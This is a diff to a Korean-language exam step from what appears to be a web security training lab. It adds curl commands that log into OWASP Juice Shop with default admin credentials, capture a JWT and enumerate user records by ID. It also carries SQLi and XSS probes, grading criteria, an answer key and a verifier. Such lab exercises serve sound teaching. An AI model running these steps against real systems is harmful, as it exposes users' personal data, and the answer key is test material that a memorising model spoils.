@@ -100,7 +100,8 @@ steps:
     instruction: |
       ## 🎯 단계 3 (30점) — Exploitation (3 vuln)
 
-      SQLi + XSS + IDOR 3 vuln 실 exploit.
+      SQLi + XSS + IDOR 3 vuln 실 exploit + 차단/우회 분석. IDOR 는 **JWT 획득
+      필수** (W08 흐름 응용).
 
       ## 💻 실행 명령
 
@@ -110,33 +111,38 @@ steps:
       curl -s -o /dev/null -w "%{http_code}\n" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
       echo "=== 2. XSS ==="
       curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>"
-      echo "=== 3. IDOR ==="
+      echo "=== 3. IDOR (JWT 획득 후) ==="
+      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
+      echo "token len: ${#TOK}"
       for id in 1 2 3; do
-        curl -s -o /dev/null -w "user $id: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id"
+        curl -s -o /dev/null -w "user $id (Bearer): %{http_code}\n" -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id"
       done
       '
       ```
 
-      ## 📋 평가
+      ## 📋 평가 (각 5점)
 
-      1. 3 vuln 실 exploit 시도
-      2. 응답 코드 매트릭스
-      3. ModSec 차단 분석
-      4. 우회 가능성 평가
-      5. 영향 분석
-      6. 운영 권장
-    hint: 3 vuln exploit
+      1. 3 vuln 실 exploit 시도 + 응답 코드 매트릭스
+      2. ModSec 차단 (SQLi 403 / XSS 403) 분석
+      3. JWT 획득 → IDOR 200 + admin role 권한 분리 결함 인지
+      4. 우회 가능성 평가 (tamper / encoding / nested)
+      5. 영향 분석 (CIA 3 축)
+      6. 운영 권장 (ModSec + JWT 검증 + RBAC)
+    hint: 3 vuln + JWT 후 IDOR
     category: exam
     points: 30
     answer: |
       ssh 6v6-attacker '
       curl -s -o /dev/null -w "SQLi: %{http_code}\n" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
       curl -s -o /dev/null -w "XSS: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>"
+      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
       for id in 1 2 3; do
-        curl -s -o /dev/null -w "user $id: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id"
+        curl -s -o /dev/null -w "user $id: %{http_code}\n" -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id"
       done
       '
-    answer_detail: 3 exploit + 응답 매트릭스.
+    answer_detail: |
+      3 exploit + JWT 흐름 응용 IDOR. SQLi/XSS 403 (ModSec 차단) + IDOR 200 (admin
+      token 후 user PII 노출).
     verify:
       type: output_contains
       expect: user
